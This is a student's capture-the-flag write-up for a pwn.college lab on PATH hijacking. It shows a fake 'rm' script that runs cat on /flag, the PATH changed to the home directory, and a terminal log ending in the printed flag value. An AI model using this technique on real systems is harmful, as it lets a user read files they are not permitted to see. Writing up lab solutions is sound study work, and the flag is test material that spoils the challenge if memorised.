# Hijacking Commands
The challenge asks you to open the terminal in the pwn.college DOJO and invoke the nano editor and 'chmod' command to obtain a different result.    

## My Solve
**Flag:** 'pwn.college{4yNHR5u-p1XxkLv6jZvYu96N_a8.QX3cjM1wCO1gjNzEzW}'     

Here,we are asked to modify the rm command such that instead of deleting the '/flag' file,it reads it out.So we have to manipulate the path in such a way wherein rm behaves as cat.So we find the path of cat using the 'which' command and then nano rm and paste the exact path there and add the '/flag' as argument.Then we enable execute permission for users using the 'chmod' command.Then we shift the PATH=/home/hacker and then run the '/challenge/run.Since rm is the same as cat,it reads out the flag.    
'''     
Connected!                                                                              
hacker@path~hijacking-commands:~$ which cat        
/run/dojo/bin/cat      
hacker@path~hijacking-commands:~$ nano rm        
hacker@path~hijacking-commands:~$ chmod a+x rm      
hacker@path~hijacking-commands:~$ PATH=/home/hacker      
hacker@path~hijacking-commands:~$ /challenge/run        
Trying to remove /flag...      
pwn.college{4yNHR5u-p1XxkLv6jZvYu96N_a8.QX3cjM1wCO1gjNzEzW}        
hacker@path~hijacking-commands:~$       
'''    

## What I Learmt
I learnt the manipulation of commands using a text editor and PATH variable.     

## References
None.      


<img width="750" height="150" alt="image" src="https://github.com/user-attachments/assets/7ee8138e-89d5-467e-9476-aeb6bc069389" />
